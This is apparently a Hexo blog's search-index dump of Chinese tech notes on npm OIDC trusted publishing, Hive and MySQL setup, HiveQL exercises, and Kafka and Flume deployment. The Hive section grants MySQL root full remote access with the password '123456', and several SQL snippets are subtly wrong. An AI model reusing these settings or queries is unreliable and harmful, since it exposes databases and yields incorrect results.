will be disabled. Classic tokens will be revoked in November. Update your CI/CD workflows to avoid disruption. Learn more: https://gh.io/npm-token-changes Important security changes to npm authentication take effect October 13,2025. New token lifetime limits (90-day max ) and TOTP 2FA restrictions become effective . Classic tokens will be revoked in November . Review changes and update your workflows now . Learn more: https://github.blog/changelog/2025-09-29-strengthening-npm-security-important-changes-to-authentication-and-token-management/ . 为了解决 npm 令牌泄露导致的问题，npm 最近的一次安全系统更新，将逐渐弃用之前的经典令牌和 TOTP 2FA。 Trusted publishing allows you to publish npm packages directly from your CI/CD workflows using OpenID Connect (OIDC) authentication, eliminating the need for long-lived npm tokens. This feature implements the trusted publishers industry standard specified by the Open Source Security Foundation (OpenSSF), joining a growing ecosystem including PyPI, RubyGems, and other major package registries in offering this security enhancement. 受信任发布允许你使用 OpenID Connect (OIDC) 身份验证直接从你的 CI / CD 工作流程中发布 npm 包，无需使用长寿命的 npm 令牌。此功能实现了 Open Source Security Foundation (OpenSSF) 指定的受信任发布者行业标准，加入了包括 PyPI、RubyGems 和其他主要包注册中心的不断增长的生态系统，提供这种安全增强功能。 注意：可信发布需要 npm CLI 版本 11.5.1 或更高版本。 笔者在写这篇文章的时候已经删除了 npm 上全部的令牌，并使用 OIDC 进行 Trusted Publisher 实现 npm 包的可信发布，以下是配置方式。 在 npmjs.com 上添加受信任的发布商导航到 npmjs.com 上的包设置（Settings）并找到 “受信任的发布者”（Trusted Publisher）部分。在 “选择您的发布者”（Select your publisher）下，通过单击 GitHub Actions 或 GitLab CI/CD 按钮来选择您的 CI/CD 提供程序。 示例： Publisher 选择 Github Actions Organization or user 填写 MyGithubUserName Repository 填写 MyRepository Workflow filename 填写 npm-publish.yml 点击 Set up connection 完成配置 之后需要配置 Github Actions。 完整 Github Actions 工作流配置示例其中比较关键的配置是需要给 GitHub Action 添加 id-token 权限，否则无法生成 OIDC 令牌。 其次是 npm CLI 的版本需要在 11.5.1 版本或以上。 .github/workflows/npm-publish.ymlname: npm-publishon: workflow_dispatch: # release: # types: [published]permissions: id-token: write # 需要给 GitHub Action 添加 id-token 权限，否则无法生成 OIDC 令牌 # packages: write # contents: write # issues: write # pull-requests: writejobs: npm-publish: name: npm-publish runs-on: ubuntu-latest steps: - name: Checkout repository uses: actions/checkout@v4 - name: Set up Node.js uses: actions/setup-node@v4 with: node-version: 24 # npm CLI 的版本需要在 11.5.1 版本或以上才支持 OIDC registry-url: https://registry.npmjs.org - name: Publish run: | npm publish# 不再需要配置 NPM TOKEN# env:# NODE_AUTH_TOKEN: ${{ secrets.npm_token }} 相关文档https://docs.npmjs.com/trusted-publishers"},{"title":"","date":"2018-10-30T02:25:00.000Z","updated":"2025-10-30T02:25:00.000Z","comments":true,"path":"notes/Hexo/index.html","permalink":"https://blog.mhuig.top/notes/Hexo/","excerpt":"","text":"Hexo Hexo .prev-next{ display: none !important; }"},{"title":"","date":"2019-05-10T06:21:00.000Z","updated":"2022-05-12T01:35:00.000Z","comments":true,"path":"notes/Hive/deploy.html","permalink":"https://blog.mhuig.top/notes/Hive/deploy","excerpt":"","text":"安装部署 Hive 安装部署 我们在此处选择第三台机器作为我们 hive 的安装机器 derby 版 hive 直接使用 解压 hivecd /export/softwarestar -zxvf hive-1.1.0-cdh5.14.0.tar.gz -C ../servers/ 直接启动 bin/hivecd /export/servers/hive-1.1.0-cdh5.14.0/bin/hivehive&gt; create database mytest; bin/hive show databases; create database mytest; show databases; cd /export/servers/hive-1.1.0-cdh5.14.0/bin./hive show databases; 刚才创建的 mytest 呢？ create database mytest2; 缺点：多个地方安装 hive 后，每一个 hive 是拥有一套自己的元数据，大家的库、表就不统一； 使用 mysql 共享 hive 元数据mysql 数据库的安装（使用 yum 源进行安装，强烈推荐） 第一步：在线安装 mysql 相关的软件包yum install mysql mysql-server mysql-devel 第二步：启动 mysql 的服务/etc/init.d/mysqld start 第三步：通过 mysql 安装自带脚本进行设置/usr/bin/mysql_secure_installation 第四步：进入 mysql 的客户端然后进行授权mysql -uroot -p grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;flush privileges; 修改 hive 的配置文件修改 hive-env.sh添加我们的 hadoop 的环境变量 cd /export/servers/hive-1.1.0-cdh5.14.0/confcp hive-env.sh.template hive-env.shvim hive-env.sh hive-env.shHADOOP_HOME=/export/servers/hadoop-2.6.0-cdh5.14.0# Hive Configuration Directory can be controlled by:export HIVE_CONF_DIR=/export/servers/hive-1.1.0-cdh5.14.0/conf 修改 hive-site.xmlcd /export/servers/hive-1.1.0-cdh5.14.0/confvim hive-site.xml hive-site.xml&lt;?xml-stylesheet type=\"text/xsl\" href=\"configuration.xsl\"?&gt;&lt;configuration&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; &lt;value&gt;jdbc:mysql://node03.hadoop.com:3306/hive?createDatabaseIfNotExist=true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; &lt;value&gt;root&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; &lt;value&gt;123456&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hive.cli.print.current.db&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hive.cli.print.header&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hive.server2.thrift.bind.host&lt;/name&gt; &lt;value&gt;node03.hadoop.com&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 上传 mysql 的 lib 驱动包将 mysql 的 lib 驱动包上传到 hive 的 lib 目录下 cd /export/servers/hive-1.1.0-cdh5.14.0/lib 将 mysql-connector-java-5.1.38.jar 上传到这个目录下 使用方式第一种交互方式：Hive 交互 shellcd /export/servers/hive-1.1.0-cdh5.14.0bin/hive 查看所有的数据库 hive (default)&gt; show databases; 创建一个数据库 hive (default)&gt; create database mydb; 使用该数据库并创建数据库表 hive (default)&gt; use mydb;hive (myhive)&gt; create table test(id int,name string); 以上命令操作完成之后，一定要确认 mysql 里面出来一个数据库 hive 第二种交互方式：Hive JDBC 服务启动 hiveserver2 服务后台启动 cd /export/servers/hive-1.1.0-cdh5.14.0nohup bin/hive --service hiveserver2 &amp; beeline 连接 hiveserver2注意：如果使用 beeline 方式连接 hiveserver2，一定要保证 hive 在 mysql 当中的元数据库已经创建成功，不然就会拒绝连接 nohup bin/hive --service metastore &amp; bin/beelinebeeline&gt; !connect jdbc:hive2://node03.hadoop.com:10000 设置 mysql 的开机启动 chkconfig --add mysqldchkconfig mysqld onservice mysqld startservice mysqld status"},{"title":"","date":"2022-05-10T06:21:00.000Z","updated":"2022-05-10T06:21:00.000Z","comments":true,"path":"notes/Hive/index.html","permalink":"https://blog.mhuig.top/notes/Hive/","excerpt":"","text":".fa-secondary{opacity:.4} Hive Hive .prev-next{ display: none !important; }"},{"title":"","date":"2019-05-10T06:21:00.000Z","updated":"2022-05-12T02:44:00.000Z","comments":true,"path":"notes/Hive/uses.html","permalink":"https://blog.mhuig.top/notes/Hive/uses","excerpt":"","text":"使用方式 Hive 使用方式 创建数据库操作创建数据库create database if not exists myhive;use myhive; 说明：hive 的表存放位置模式是由 hive-site.xml 当中的一个属性指定的 hive-site.xml&lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt;&lt;value&gt;/user/hive/warehouse&lt;/value&gt; 创建数据库并指定 hdfs 存储位置create database mydb02 location '/myhive22'; 修改数据库可以使用 alter database 命令来修改数据库的一些属性。但是数据库的元数据信息是不可更改的，包括数据库的名称以及数据库所在的位置 alter database mydb02 set dbproperties('createtime'='20190708'); 查看数据库详细信息查看数据库基本信息 desc database mydb02; 查看数据库更多详细信息 desc database extended mydb02; 删除数据库删除一个空数据库，如果数据库下面有数据表，那么就会报错 drop database myhive2; 强制删除数据库，包含数据库下面的表一起删除 drop database mydb02; cascade; 创建数据库表操作创建数据库表语法CREATE [EXTERNAL] TABLE [IF NOT EXISTS] table_name [(col_name data_type [COMMENT col_comment], ...)] [COMMENT table_comment] [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)] [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] [ROW FORMAT row_format] [STORED AS file_format] [LOCATION hdfs_path] 说明：1、 CREATE TABLE 创建一个指定名字的表。如果相同名字的表已经存在，则抛出异常；用户可以用 IF NOT EXISTS 选项来忽略这个异常。2、 EXTERNAL 关键字可以让用户创建一个外部表，在建表的同时指定一个指向实际数据的路径（LOCATION），Hive 创建内部表时，会将数据移动到数据仓库指向的路径；若创建外部表，仅记录数据所在的路径，不对数据的位置做任何改变。在删除表的时候，内部表的元数据和数据会被一起删除，而外部表只删除元数据，不删除数据。3、LIKE 允许用户复制现有的表结构，但是不复制数据。4、ROW FORMAT DELIMITED [FIELDS TERMINATED BY char] [COLLECTION ITEMS TERMINATED BY char] [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char] | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, ...)] 用户在建表的时候可以自定义 SerDe 或者使用自带的 SerDe。如果没有指定 ROW FORMAT 或者 ROW FORMAT DELIMITED，将会使用自带的SerDe。在建表的时候，用户还需要为表指定列，用户在指定表的列的同时也会指定自定义的 SerDe，Hive 通过 SerDe 确定表的具体的列的数据。5、 STORED AS SEQUENCEFILE|TEXTFILE|RCFILE 如果文件数据是纯文本，可以使用 STORED AS TEXTFILE。 hive 建表use mydb01;create table stu(id int,name string);insert into stu values (1,\"Tom\");select * from stu; 创建表并指定字段之间的分隔符 create table if not exists stu2(id int ,name string) row format delimited fieldsterminated by '\\t' stored as textfile location '/user/stu2'; 根据查询结果创建表 create table stu3 as select * from stu; 根据已经存在的表结构创建表 create table stu4 like stu; 查询表的类型 desc formatted stu2; 操作案例 分别创建老师与学生表表，并向表中加载数据创建老师表： create table teacher (t_id string,t_name string) row format delimited fields terminated by '\\t'; 创建学生表： create table student (s_id string,s_name string,s_birth string , s_sex string ) row format delimited fields terminated by '\\t'; 从本地文件系统向表中加载数据 load data local inpath '/export/servers/hivedatas/student.csv' into table student; 从 hdfs 文件系统向表中加载数据（需要提前将数据上传到 hdfs 文件系统，其实就是一个移动文件的操作） cd /export/servers/hivedatashdfs dfs -mkdir -p /hivedatashdfs dfs -put /export/servers/hivedatas/teacher.csv /hivedatas/load data inpath '/hivedatas/teacher.csv' into table teacher; 创建普通表, 并向表中加载数据 create table course (c_id string,c_name string,t_id string) row format delimited fields terminated by '\\t';load data local inpath '/export/servers/hivedatas/course.csv' into table course;create table score (s_id string,c_id string,s_score int) row format delimited fields terminated by '\\t';load data local inpath '/export/servers/hivedatas/score.csv' into table score; hive 语句综合操作1、查询姓氏首字母为 \"M\" 的教练的数量 select count(t_id) from teacher where t_name like 'M%'; 2、查询学过 \"MILLER\" 教练授课的同学的信息 select stu.* from student stu,score sc where stu.s_id = sc.s_id and sc.c_id in (select c_id from course c, teacher t where t.t_id = c.t_id and t_name = 'MILLER'); 3、查询所有同学的学生编号、学生姓名、选课总数、所有运动的总成绩 select stu.s_id,stu.s_name,count(sc.c_id) sum_course,sum(sc.s_score) sum_score from student stu left join score sc on stu.s_id = sc.s_id group by stu.s_id,stu.s_name; 4、查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩 select stu.s_id,stu.s_name,avg(sc.s_score) avg_score from student stu left join score sc on stu.s_id = sc.s_id group by stu.s_id,stu.s_name having avg_score &gt;= 60;select stu.s_id,stu.s_name,Round(avg(sc.s_score),2) avg_score from student stu left join score sc on stu.s_id = sc.s_id group by stu.s_id,stu.s_name having Round(avg(sc.s_score),2) &gt;= 60; 5、查询平均成绩小于 60 分的同学的学生编号和学生姓名和平均成绩 (包括有成绩的和无成绩的) select stu.s_id,stu.s_name,avg(sc.s_score) avg_score from student stu left join score sc on stu.s_id = sc.s_id group by stu.s_id,stu.s_name having avg_score &lt; 60;select stu.s_id,stu.s_name,0 avg_score from student stu where stu.s_id not in(select distinct sc.s_id from score sc);select stu.s_id,stu.s_name,avg(sc.s_score) avg_score from student stu left join score sc on stu.s_id = sc.s_id group by stu.s_id,stu.s_name having avg_score &lt; 60 union all select stu.s_id,stu.s_name,0 avg_score from student stu where stu.s_id not in(select distinct sc.s_id from score sc); 6、查询学过编号为 \"01\" 并且也学过编号为 \"02\" 的运动的同学的信息 select stu.* from student stu,score sc,score sc2 where stu.s_id = sc.s_id and stu.s_id = sc2.s_id and sc.c_id = '01'and sc2.c_id = '02'; 7、查询男生、女生人数 select count(s_sex='female'),count(s_sex='male') from student; 8、查询不及格的课程，并按课程号从大到小排列 select sc.c_id,sc.s_score from score sc where sc.s_score&lt;60 order by sc.c_id desc; 9、查询课程编号为 \"01\" 且课程成绩在 60 分以上的学生的学号和姓名； select stu.s_id,stu.s_name,sc.s_score,sc.c_id from score sc,student stu where sc.s_id=stu.s_id and sc.c_id = 01 and sc.s_score&gt;60; 10、查询不及格的课程，并按课程号从大到小排列 select sc.c_id,sc.s_score FROM score sc WHERE sc.s_score&lt;60 order by sc.c_id desc;"},{"title":"","date":"2022-05-10T07:23:00.000Z","updated":"2022-05-12T05:54:00.000Z","comments":true,"path":"notes/Kafka/deploy.html","permalink":"https://blog.mhuig.top/notes/Kafka/deploy","excerpt":"","text":"安装部署 kafka 的安装部署 下载下载 kafka 安装压缩包http://archive.apache.org/dist/kafka/ 安装kafka 的安装：kafka 的安装必须要先安装 zk，必须要保证时钟同步 第一步：下载上传解压压缩包cd /export/softwarestar -zxvf kafka_2.11-1.0.0.tgz -C ../servers/ 第二步：修改配置文件第一台修改配置文件 cd /export/servers/kafka_2.11-1.0.0/configvim server.properties server.propertiesbroker.id=0log.dirs=/export/servers/kafka_2.11-1.0.0/logszookeeper.connect=node01:2181,node02:2181,node03:2181delete.topic.enable=truehost.name=node01scp -r kafka_2.11-1.0.0/ node02:$PWD 第二台修改配置文件 cd /export/servers/kafka_2.11-1.0.0/configvim server.properties server.propertiesbroker.id=1log.dirs=/export/servers/kafka_2.11-1.0.0/logszookeeper.connect=node01:2181,node02:2181,node03:2181delete.topic.enable=truehost.name=node02scp -r kafka_2.11-1.0.0/ node03:$PWD 第三台修改配置文件 cd /export/servers/kafka_2.11-1.0.0/configvim server.properties server.propertiesbroker.id=2log.dirs=/export/servers/kafka_2.11-1.0.0/logszookeeper.connect=node01:2181,node02:2181,node03:2181delete.topic.enable=truehost.name=node03 第三步：三台机器启动 kafka 集群前台启动 bin/kafka-server-start.sh config/server.properties 进程后台启动 nohup bin/kafka-server-start.sh config/server.properties &amp;"},{"title":"","date":"2022-05-10T06:21:00.000Z","updated":"2022-05-10T06:21:00.000Z","comments":true,"path":"notes/Kafka/index.html","permalink":"https://blog.mhuig.top/notes/Kafka/","excerpt":"","text":".fa-secondary{opacity:.4} Kafka Kafka .prev-next{ display: none !important; }"},{"title":"","date":"2022-05-10T07:25:00.000Z","updated":"2022-05-12T06:28:00.000Z","comments":true,"path":"notes/Kafka/manager.html","permalink":"https://blog.mhuig.top/notes/Kafka/manager","excerpt":"","text":"Kafka Manager kafka-manager 监控工具的使用 第一步：下载 kafkaManager源码下载地址： https://github.com/yahoo/kafka-manager/ 下载源码，然后上传解压准备编译 cd /export/servers/kafka-manager-1.3.3.15unzip kafka-manager-1.3.3.15.zip -d ../servers/./sbt clean dist 编译完成之后，我们需要的安装包就在这个路径之下 /export/servers/kafka-manager-1.3.3.15/target/universal 需要下载源码进行自己编译，比较麻烦，不要自己编译，已经有编译好的版本可以拿过来直接使用即可 第二步：上传编译好的压缩包并解压将我们编译好的 kafkamanager 的压缩包上传到服务器并解压 cd /export/softwaresunzip kafka-manager-1.3.3.15.zip -d /export/servers/ 第三步：修改配置文件cd /export/servers/kafka-manager-1.3.3.15/vim conf/application.conf application.confkafka-manager.zkhosts=\"node01:2181,node02:2181,node03:2181\" 第四步：为 kafkamanager 的启动脚本添加执行权限cd /export/servers/kafka-manager-1.3.3.15/binchmod u+x ./* 第五步：启动 kafkamanager 进程cd /export/servers/kafka-manager-1.3.3.15nohup bin/kafka-manager -Dconfig.file=/export/servers/kafka-manager1.3.3.15/conf/application.conf -Dhttp.port=8070 2&gt;&amp;1 &amp; 第六步：浏览器页面访问http://node01:8070/"},{"title":"","date":"2022-05-10T07:22:00.000Z","updated":"2022-05-12T05:47:00.000Z","comments":true,"path":"notes/Kafka/overview.html","permalink":"https://blog.mhuig.top/notes/Kafka/overview","excerpt":"","text":"Overview kafka 的介绍 消息队列Kafka: 是由 Linked 开源提供的分布式消息队列, 由 scala 语言写成的 消息队列的作用: 解耦 异步 并行 推送和拉取传统的消息队列给予 pub sub 发布和订阅 Kafka 消息队列基于: push pull 过程 推送和拉取 构架模型Producer: 生产者, 生产消息的 主要接收一些外部的数据源 从外部获取数据 我们可以从 flume 中获取数据 kafkaAPI: 生产数据, 通过 push 的方式主动将数据推送到 kafka 的 topic 当中去 topic: 主题, 说白了里面就是一些各种数据 partition: 消息的分区, 解决横向扩展问题. 为了解决 partition 丢失问题, 引用了一个副本机制. Broker: 一个服务器叫做一个 broker; Consumer: 消费者, 主要用来消费数据的, 主动的 pull 到 topic 拉取数据 Zookeeper: 为了解决消费者消费数据的时候, 确定 topic 中到底有多少个 parttion, 都在哪些机器上. Kafka 消费模型: 组的概念, 同一时间, 一个组中, 只能有一个线程去消费 parttion 中的数据, Partition 里面包含了多个 segement,segement 里面两个文件 .log 文件 .index 文件 .log 记录了我们的数据, 文件是顺序读写的 .index 记录了.log 文件的索引 Offset: 消息的偏移量, 我们消费数据的时候, 都要记录消息的 offset, 下次再消费的时候, 我们就可以确定数据该从哪里进行消费"},{"title":"","date":"2022-05-10T07:24:00.000Z","updated":"2022-05-12T06:00:00.000Z","comments":true,"path":"notes/Kafka/uses.html","permalink":"https://blog.mhuig.top/notes/Kafka/uses","excerpt":"","text":"管理使用 kafka 的管理使用 命令行创建 topicbin/kafka-topics.sh --create --partitions 3 --topic test --replication-factor 2 --zookeeper node01:2181,node02:2181,node03:2181 模拟消息的生产者：bin/kafka-console-producer.sh --broker-list node01:9092,node02:9092,node03:9092 --topic test 模拟消息的消费者bin/kafka-console-consumer.sh --bootstrap-server node01:9092,node02:9092,node03:9092 --from-beginning --topic test 消费为什么没顺序? javaAPI生产者 APIpublic class MyKafkaProducer { public static void main(String[] args) { Properties props = new Properties(); props.put(\"bootstrap.servers\", \"node01:9092,node02:9092,node03:9092\"); props.put(\"acks\", \"all\"); props.put(\"retries\", 0); props.put(\"batch.size\", 16384); props.put(\"linger.ms\", 1); props.put(\"buffer.memory\", 33554432); props.put(\"key.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\"); props.put(\"value.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\"); Producer&lt;String, String&gt; producer = new KafkaProducer&lt;String,String&gt;(props); for (int i = 0; i &lt; 100; i++){ producer.send(new ProducerRecord&lt;String, String&gt;(\"test\", Integer.toString(i), Integer.toString(i))); } producer.close(); }} 消费者 APIpublic class MyKafkaConsumer { public static void main(String[] args) { /** * 自动提交 offset * */ Properties props = new Properties(); props.put(\"bootstrap.servers\", \"node01:9092,node02:9092,node03:9092\"); //设置我们的消费是属于哪一个组的，这个组名随便取，与别人的不重复即可 props.put(\"group.id\", \"test\"); //设置我们的 offset 值自动提交 props.put(\"enable.auto.commit\", \"true\"); //offset 的值自动提交的频率 1 提交 1.5 消费了 500 调数据 1.6 秒宕机了 2 提交 offset props.put(\"auto.commit.interval.ms\", \"1000\"); props.put(\"key.deserializer\", \"org.apache.kafka.common.serialization.StringDeserializer\"); props.put(\"value.deserializer\", \"org.apache.kafka.common.serialization.StringDeserializer\"); KafkaConsumer&lt;String, String&gt; consumer = new KafkaConsumer&lt;String,String&gt;(props); //消费者订阅我们的 topic consumer.subscribe(Arrays.asList(\"test\")); //相当于开启了一个线程，一直在运行，等待 topic 当中有数据就去拉取数据 while (true) { //push poll ConsumerRecords&lt;String, String&gt; records = consumer.poll(100); for (ConsumerRecord&lt;String, String&gt; record : records) System.out.printf(\"offset = %d, key = %s, value = %s%n\", record.offset(), record.key(), record.value()); } }} 数据的分区探究的是 kafka 的数据生产出来之后究竟落到了哪一个分区里面去了 第一种分区策略：给定了分区号，直接将数据发送到指定的分区里面去 第二种分区策略：没有给定分区号，给定数据的 key 值，通过 key 取上 hashCode 进行分区 第三种分区策略：既没有给定分区号，也没有给定 key 值，直接轮循进行分区 第四种分区策略：自定义分区 producer.send(new ProducerRecord&lt;String, String&gt;(\"test\",Integer.toString(i), Integer.toString(i)));//kafka 的第一种分区方式，如果给定了分区号，那么就直接将数据发送到指定的分区号里面去producer.send(new ProducerRecord&lt;String, String&gt;(\"test\",2,\"helloworld\",i+\"\"));//kafka 的第二种分区策略，没有给定分区号，给定了数据的 key，那么就通过 key 取 hashcode，将数据均匀的发送到三台机器里面去//注意如果实际工作当中，要通过 key 取上 hashcode 来进行分区，那么就一定要 保证 key 的变化，否则，数据就会全部去往一个分区里面producer.send(new ProducerRecord&lt;String, String&gt;(\"test\",i+\"\",i+\"\"));//kafka 的第三种分区策略，既没有给定分区号，也没有给定数据的 key 值，那么就会按照轮循的方式进行数的发送producer.send(new ProducerRecord&lt;String, String&gt;(\"test\",i+\"\"));//kafka 的第四种分区策略，自定义分区类，实现我们数据的分区 配置文件Server.properties 配置文件说明 #broker 的全局唯一编号，不能重复broker.id=0#用来监听链接的端口，producer 或 consumer 将在此端口建立连接port=9092#处理网络请求的线程数量num.network.threads=3#用来处理磁盘 IO 的线程数量 页缓存功能 线程数量num.io.threads=8#发送套接字的缓冲区大小socket.send.buffer.bytes=102400#接受套接字的缓冲区大小socket.receive.buffer.bytes=102400#请求套接字的缓冲区大小socket.request.max.bytes=104857600#kafka 运行日志存放的路径 确定我们磁盘的路径 df -lh 多个磁盘路径用逗号隔开log.dirs=/export/data/kafka/#topic 在当前 broker 上的分片个数，(一般都是在创建 topic 的时候手动指定好了分区的个数)num.partitions=2#用来恢复和清理 data 下数据的线程数量 文件什么时候删除 168h 后 7 天后num.recovery.threads.per.data.dir=1#segment 文件保留的最长时间，超时将被删除log.retention.hours=1#滚动生成新的 segment 文件的最大时间log.roll.hours=1#日志文件中每个 segment 的大小，默认为 1Glog.segment.bytes=1073741824 新的 segemnt 文件生成的策略： 第一个: 时间长短，一个小时生成一个新的 第二个：文件大小，segement 文件达到 1G 也生成新的文件 #周期性检查文件大小的时间log.retention.check.interval.ms=300000#日志清理是否打开log.cleaner.enable=true#broker 需要使用 zookeeper 保存 meta 数据zookeeper.connect=zk01:2181,zk02:2181,zk03:2181#zookeeper 链接超时时间zookeeper.connection.timeout.ms=6000#partion buffer 中，消息的条数达到阈值，将触发 flush 到磁盘(页缓存里面有多少条数据 开始发)log.flush.interval.messages=10000#消息 buffer 的时间，达到阈值，将触发 flush 到磁盘log.flush.interval.ms=3000#删除 topic 需要 server.properties 中设置 delete.topic.enable=true 否则只是标记删除delete.topic.enable=true#此处的 host.name 为本机 IP(重要),如果不改,则客户端会抛出:Producer connection to localhost:9092 unsuccessful 错误!host.name=node01advertised.host.name=192.168.52.100 #广播地址 一般用不到 producer 生产者配置文件说明 生产数据的时候，尽量使用异步模式，可以提高数据生产的效率 #指定 kafka 节点列表，用于获取 metadata，不必全部指定metadata.broker.list=node01:9092,node02:9092,node03:9092# 指定分区处理类。默认 kafka.producer.DefaultPartitioner，表通过 key 哈希到对应分区#partitioner.class=kafka.producer.DefaultPartitioner# 是否压缩，默认 0 表示不压缩，1 表示用 gzip 压缩，2 表示用 snappy 压缩。压缩后消息中会有头来指明消息压缩类型，故在消费者端消息解压是透明的无需指定。compression.codec=none# 指定序列化处理类serializer.class=kafka.serializer.DefaultEncoder# 如果要压缩消息，这里指定哪些 topic 要压缩消息，默认 empty，表示不压缩。#compressed.topics=# 设置发送数据是否需要服务端的反馈,有三个值 0,1,-1# 0: producer 不会等待 broker 发送 ack# 1: 当 leader 接收到消息之后发送 ack# -1: 当所有的 follower 都同步消息成功后发送 ack.request.required.acks=1# 在向 producer 发送 ack 之前,broker 允许等待的最大时间 ，如果超时,broker 将会向 producer 发送一个 error ACK.意味着上一次消息因为某种原因未能成功(比如 follower 未能同步成功)request.timeout.ms=10000# 同步还是异步发送消息，默认“sync”表同步，\"async\"表异步。异步可以提高发送吞吐量,也意味着消息将会在本地 buffer 中,并适时批量发送，但是也可能导致丢失未发送过去的消息producer.type=sync# 在 async 模式下,当 message 被缓存的时间超过此值后,将会批量发送给broker,默认为 5000ms# 此值和 batch.num.messages 协同工作.queue.buffering.max.ms = 5000# 在 async 模式下,producer 端允许 buffer 的最大消息量# 无论如何,producer 都无法尽快的将消息发送给 broker,从而导致消息在producer 端大量沉积# 此时,如果消息的条数达到阀值,将会导致 producer 端阻塞或者消息被抛弃，默认为 10000queue.buffering.max.messages=20000# 如果是异步，指定每次批量发送数据量，默认为 200batch.num.messages=500# 当消息在 producer 端沉积的条数达到\"queue.buffering.max.meesages\"后# 阻塞一定时间后,队列仍然没有 enqueue(producer 仍然没有发送出任何消息)# 此时 producer 可以继续阻塞或者将消息抛弃,此 timeout 值用于控制\"阻塞\"的时间# -1: 无阻塞超时限制,消息不会被抛弃# 0:立即清空队列,消息被抛弃queue.enqueue.timeout.ms=-1# 当 producer 接收到 error ACK,或者没有接收到 ACK 时,允许消息重发的次数# 因为 broker 并没有完整的机制来避免消息重复,所以当网络异常时(比如ACK 丢失)# 有可能导致 broker 接收到重复的消息,默认值为 3.message.send.max.retries=3# producer 刷新 topic metada 的时间间隔,producer 需要知道 partition leader的位置,以及当前 topic 的情况# 因此 producer 需要一个机制来获取最新的 metadata,当 producer 遇到特定错误时,将会立即刷新# (比如 topic 失效,partition 丢失,leader 失效等),此外也可以通过此参数来配置额外的刷新机制，默认值 600000topic.metadata.refresh.interval.ms=60000 consumer 消费者配置详细说明 # zookeeper 连接服务器地址zookeeper.connect=zk01:2181,zk02:2181,zk03:2181# zookeeper 的 session 过期时间，默认 5000ms，用于检测消费者是否挂掉zookeeper.session.timeout.ms=5000#当消费者挂掉，其他消费者要等该指定时间才能检查到并且触发重新负载均衡zookeeper.connection.timeout.ms=10000# 指定多久消费者更新 offset 到 zookeeper 中。注意 offset 更新时基于 time而不是每次获得的消息。一旦在更新 zookeeper 发生异常并重启，将可能拿到已拿到过的消息(原来正在消费的线程保护期 看死没死透)zookeeper.sync.time.ms=2000#指定消费group.id=qst# 当 consumer 消费一定量的消息之后,将会自动向 zookeeper 提交 offset 信息# 注意 offset 信息并不是每消费一次消息就向 zk 提交一次,而是现在本地保存(内存),并定期提交,默认为 trueauto.commit.enable=true# 自动更新时间。默认 60 * 1000auto.commit.interval.ms=1000# 当前 consumer 的标识,可以设定,也可以有系统生成,主要用来跟踪消息消费情况,便于观察conusmer.id=xxx (没什么用)# 消费者客户端编号，用于区分不同客户端，默认客户端程序自动产生client.id=xxxx (没什么用)# 最大取多少块缓存到消费者(默认 10)queued.max.message.chunks=50(尽量一次多去点儿)# 当有新的 consumer 加入到 group 时,将会 reblance,此后将会有 partitions 的消费端迁移到新的 consumer上 ,如果一个 consumer 获得了某个 partition 的消费权限,那么它将会向 zk 注册 \"Partition Owner registry\"节点信息,但是有可能此时旧的 consumer 尚没有释放此节点, 此值用于控制,注册节点的重试次数.rebalance.max.retries=5# 获取消息的最大尺寸,broker 不会像 consumer 输出大于此值的消息 chunk每次 feth 将得到多条消息 ,此值为总大小 ,提升此值 ,将会消耗更多的 consumer 端内存fetch.min.bytes=6553600# 当消息的尺寸不足时,server 阻塞的时间,如果超时,消息将立即发送给consumerfetch.wait.max.ms=5000socket.receive.buffer.bytes=655360# 如果 zookeeper 没有 offset 值或 offset 值超出范围。那么就给个初始的 offset。有 smallest、largest、anything 可选，分别表示给当前最小的 offset、当前最大的 offset、抛异常。默认 largestauto.offset.reset=smallest# 指定序列化处理类derializer.class=kafka.serializer.DefaultDecoder flume 与 kafka 的整合需求：使用 flume 监控某一个文件夹下面的文件的产生，有了新文件，就将文件内容收集起来放到 kafka 消息队列当中 source：spoolDir Sourcechannel：memory channelsink：数据发送到 kafka 里面去 flume 与 kafka 的配置文件开发 第一步：flume 下载地址http://archive.cloudera.com/cdh5/cdh/5/flume-ng-1.6.0-cdh5.14.0.tar.gz 第二步：上传解压 flume 第三步：配置 flume.conf flume.confa1.sources = r1a1.channels = c1a1.sinks = k1a1.sources.r1.channels = c1a1.sources.r1.type = spooldira1.sources.r1.spoolDir = /export/servers/flumedataa1.sources.r1.deletePolicy = nevera1.sources.r1.fileSuffix = .COMPLETEDa1.sources.r1.ignorePattern = ^(.)*\\\\.tmp$a1.sources.r1.inputCharset = GBKa1.channels.c1.type = memorya1.sinks.k1.channel = c1a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.topic = testa1.sinks.k1.kafka.bootstrap.servers = node01:9092,node02:9092,node03:9092a1.sinks.k1.kafka.flumeBatchSize = 20a1.sinks.k1.kafka.producer.acks = 1 创建 flumedata 目录 mkdir -p /export/servers/flumedata 启动 flume bin/flume-ng agent --conf conf --conf-file conf/flume.conf --name a1 -Dflume.root.logger=INFO,console 消费数据 bin/kafka-console-consumer.sh --bootstrap-servernode01:9092,node02:9092,node03:9092 --from-beginning --topic 